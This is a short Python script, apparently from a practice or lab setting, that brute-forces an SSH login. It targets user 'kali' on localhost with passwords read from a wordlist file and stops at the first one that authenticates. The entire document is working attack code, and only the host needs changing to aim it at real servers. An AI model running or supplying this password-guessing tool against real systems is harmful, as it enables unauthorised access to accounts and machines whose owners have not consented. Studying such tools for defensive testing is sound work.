from pwn import *
import paramiko

host = "127.0.0.1"
username = "kali"
attempts = 0
with open("ssh-pass.txt", "r") as pass_list:
    for password in pass_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected() : 
                print("[>] This is valid password of host: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1
